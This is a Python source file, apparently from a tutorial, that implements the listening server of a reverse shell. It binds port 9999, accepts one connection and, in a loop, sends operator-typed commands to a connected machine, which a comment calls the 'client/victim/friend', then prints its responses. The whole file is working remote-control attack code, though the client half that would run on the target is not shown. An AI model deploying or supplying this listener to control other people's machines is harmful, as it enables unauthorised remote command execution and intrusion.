import socket
import sys

 # create socket (connect 2 computers)
def create_socket():
	
	try:
		global host
		global port
		global s # for socket
		host = ""
		port = 9999 # using this port because it is uncommon and not used a lot 
		s = socket.socket()

	except socket.error as msg:
		print(f"Socket creation error: {socket.error}")

# binding socket with host and port and listening for connections
def bind_socket():
	try:
		global host
		global port
		global s

		print(f"Binding the port {port}")

		s.bind((host, port))
		s.listen(5)

	except socket.error as msg:
		print(f"Socket creation error: {socket.error} \n Retrying....")
		bind_socket()

# establish connection with a client and the socket must be listening

def socket_accept():
	conn, address = s.accept()
	print(f"Connection has been established... IP:{address[0]} Port:{address[1]}")
	send_commands(conn)
	conn.close()

# send command to client/victim/friend
def send_commands(conn):
	while True:
		cmd = input()
		if cmd ==  "quit":
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd))>0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end="")


def main():
	create_socket()
	bind_socket()
	socket_accept()

main()